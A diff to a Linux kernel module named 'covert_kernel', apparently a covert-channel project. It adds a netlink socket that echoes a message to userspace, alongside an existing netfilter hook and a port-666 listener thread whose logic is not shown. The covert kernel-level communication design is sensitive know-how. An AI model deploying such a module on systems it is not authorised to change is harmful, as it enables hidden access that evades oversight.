@@ -5,20 +5,24 @@
 #include <linux/module.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
+#include <linux/netlink.h>
+#include <linux/skbuff.h>
 #include <linux/slab.h>
 #include <linux/tcp.h>
 #include <net/sock.h>
 
 #define PORT 666
+#define MAX_PAYLOAD 1024
 
 struct service {
     struct socket* listen_socket;
     struct task_struct* thread;
 };
 
+struct nf_hook_ops nfho;
 struct service* svc;
-
-static struct nf_hook_ops nfho;
+struct sock* nl_sk;
+unsigned char* buffer;
 
 int recv_msg(struct socket* sock, unsigned char* buf, int len) {
     struct msghdr msg;
@@ -173,10 +177,55 @@ unsigned int hook_func(void* priv, struct sk_buff* skb, const struct nf_hook_sta
     return NF_ACCEPT;
 }
 
+static void echo_netlink(struct sk_buff* skb) {
+    struct nlmsghdr* nlh;
+    int pid;
+    struct sk_buff* skb_out;
+    int msg_size;
+    char* msg = "Hello from kernel";
+    int res;
+
+    printk(KERN_INFO "Entering: %s\n", __FUNCTION__);
+
+    msg_size = strlen(msg) + 1;
+
+    nlh = (struct nlmsghdr*) skb->data;
+    printk(KERN_INFO "Netlink received msg payload:%s\n", (char*) nlmsg_data(nlh));
+    //PID of sending process
+    pid = nlh->nlmsg_pid;
+
+    skb_out = nlmsg_new(msg_size, 0);
+    if (!skb_out) {
+        printk(KERN_ERR "Failed to allocate new skb\n");
+        return;
+    }
+
+    nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
+    //Not in multicast group
+    NETLINK_CB(skb_out).dst_group = 0;
+    memcpy(nlmsg_data(nlh), msg, msg_size);
+
+    res = nlmsg_unicast(nl_sk, skb_out, pid);
+    if (res < 0) {
+        printk(KERN_INFO "Error while sending back to user\n");
+    }
+}
+
 static int __init mod_init(void) {
+    struct netlink_kernel_cfg cfg = {
+            .input = echo_netlink,
+    };
+
     svc = kmalloc(sizeof(struct service), GFP_KERNEL);
     svc->thread = kthread_run((void*) start_listen, NULL, "packet_send");
     printk(KERN_ALERT "covert_kernel module loaded\n");
+
+    nl_sk = netlink_kernel_create(&init_net, NETLINK_USERSOCK, &cfg);
+    if (!nl_sk) {
+        printk(KERN_ALERT "Error creating socket.\n");
+        return -ENOMEM;
+    }
+    buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
 
     nfho.hook = hook_func;
     nfho.hooknum = NF_INET_LOCAL_IN;
@@ -190,6 +239,8 @@ static int __init mod_init(void) {
 static void __exit mod_exit(void) {
     nf_unregister_net_hook(&init_net, &nfho);
 
+    netlink_kernel_release(nl_sk);
+
     if (svc->listen_socket != NULL) {
         kernel_sock_shutdown(svc->listen_socket, SHUT_RDWR);
         sock_release(svc->listen_socket);
@@ -197,6 +248,7 @@ static void __exit mod_exit(void) {
     }
 
     kfree(svc);
+    kfree(buffer);
     printk(KERN_ALERT "removed covert_kernel module\n");
 }
 
